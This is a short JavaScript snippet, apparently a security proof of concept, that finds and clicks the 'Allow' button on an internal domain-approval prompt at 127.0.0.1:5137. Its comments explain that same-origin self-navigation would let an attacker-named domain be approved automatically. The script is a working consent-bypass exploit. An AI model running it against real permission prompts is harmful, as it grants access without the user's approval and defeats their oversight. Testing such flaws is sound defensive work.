// Click the Allow button on the self-navigated internal domain-approval prompt.
// The page is at 127.0.0.1:5137 (internal origin), so this eval is same-origin
// to the page — exactly the privilege a self-navigation confers. If a grant for
// the attacker-named domain appears in domain_permissions, the self-nav writes
// arbitrary approvals.
(function () {
  var btns = Array.prototype.slice.call(document.querySelectorAll('button'));
  var allow = btns.filter(function(b){ return (b.innerText||'').trim() === 'Allow'; })[0];
  if (!allow) return JSON.stringify({ clicked:false, reason:'no Allow button' });
  allow.click();
  return JSON.stringify({ clicked:true, domainInPage: location.search });
})()
